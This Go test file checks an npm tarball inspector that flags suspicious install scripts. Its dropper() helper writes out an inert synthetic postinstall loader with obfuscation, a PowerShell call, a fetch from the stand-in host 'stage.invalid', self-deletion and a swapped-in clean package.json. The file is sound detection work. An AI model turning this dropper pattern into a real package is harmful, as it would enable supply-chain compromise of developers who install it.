package tarball

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"strings"
	"testing"
)

func pack(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		tw.WriteHeader(&tar.Header{Name: "package/" + name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
		tw.Write([]byte(body))
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

// A synthetic dropper with the traits public reporting describes for the
// 2026 install-time loaders: obfuscated, platform-specific, fetches a second
// stage, then deletes itself and swaps a clean package.json back in so
// `npm ls` shows an innocent version. It's inert text; nothing runs it.
func dropper() string {
	var b strings.Builder
	b.WriteString("function _0x1a2b(){var _0x3c4d=['push','shift'];return _0x3c4d;}")
	b.WriteString("(function(_0x5e6f,_0x7a8b){var _0x9c0d=_0x5e6f();while(!![]){try{var _0x1e2f=parseInt('1');if(_0x1e2f===_0x7a8b)break;else _0x9c0d['push'](_0x9c0d['shift']());}catch(_0x3a4b){_0x9c0d['push'](_0x9c0d['shift']());}}}(_0x1a2b,0x1));")
	for i := 0; i < 40; i++ {
		b.WriteString("var _0x" + strings.Repeat("ab", 2) + string(rune('a'+i%6)) + "1=_0x1a2b();")
	}
	b.WriteString(`const cp=require('child_process'),https=require('https'),fs=require('fs');`)
	b.WriteString(`if(process.platform==='win32'){cp.execSync('powershell -enc AAAA')}else{https.get('https://stage.invalid/x')}`)
	b.WriteString(`fs.unlinkSync(__filename);fs.renameSync('package.md','package.json');`)
	return b.String()
}

func TestInspectDropper(t *testing.T) {
	prev, err := Read(pack(t, map[string]string{
		"package.json": `{"name":"demo-lib","version":"4.2.0"}`,
		"index.js":     "module.exports = require('./lib');",
	}))
	if err != nil {
		t.Fatal(err)
	}
	cur, err := Read(pack(t, map[string]string{
		"package.json": `{"name":"demo-lib","version":"4.2.1","scripts":{"postinstall":"node setup.js"}}`,
		"index.js":     "module.exports = require('./lib');",
		"setup.js":     dropper(),
		"package.md":   `{"name":"demo-lib","version":"4.2.0"}`,
	}))
	if err != nil {
		t.Fatal(err)
	}
	if cur.Version != "4.2.1" || cur.Scripts["postinstall"] != "node setup.js" {
		t.Fatalf("package.json not read: %+v", cur.Scripts)
	}
	kinds := map[string]string{}
	for _, f := range Inspect(cur, prev) {
		kinds[f.Kind] += f.Detail + " | "
	}
	if !strings.Contains(kinds["obfuscated_code"], "setup.js (run on install)") || !strings.Contains(kinds["obfuscated_code"], "string array rotation") {
		t.Errorf("obfuscation: %q", kinds["obfuscated_code"])
	}
	for _, want := range []string{"starts processes", "makes network requests", "downloads and runs a script", "branches on the operating system"} {
		if !strings.Contains(kinds["install_script_behaviour"], want) {
			t.Errorf("behaviour %q missing: %q", want, kinds["install_script_behaviour"])
		}
	}
	if !strings.Contains(kinds["self_tampering"], "deletes itself") || !strings.Contains(kinds["self_tampering"], "rewrites the package's own package.json") {
		t.Errorf("tampering: %q", kinds["self_tampering"])
	}
}

func TestInspectBenignNativeBuild(t *testing.T) {
	cur, _ := Read(pack(t, map[string]string{
		"package.json":       `{"name":"native-thing","version":"1.0.0","scripts":{"install":"node scripts/install.js"}}`,
		"scripts/install.js": `const { execSync } = require('child_process'); execSync('node-gyp rebuild', { stdio: 'inherit' });`,
		"index.js":           strings.Repeat("// plain readable source\nmodule.exports = 1;\n", 50),
	}))
	if fs := Inspect(cur, nil); len(fs) != 0 {
		t.Errorf("benign install script flagged: %+v", fs)
	}
}

func TestInstallTargets(t *testing.T) {
	p := &Package{
		Files:   map[string][]byte{"a.js": nil, "lib/b.cjs": nil, "c.sh": nil},
		Scripts: map[string]string{"preinstall": "node ./a.js && node --no-warnings lib/b.cjs", "postinstall": "sh c.sh"},
	}
	got := strings.Join(installTargets(p), ",")
	if got != "a.js,lib/b.cjs,c.sh" {
		t.Errorf("targets %s", got)
	}
}
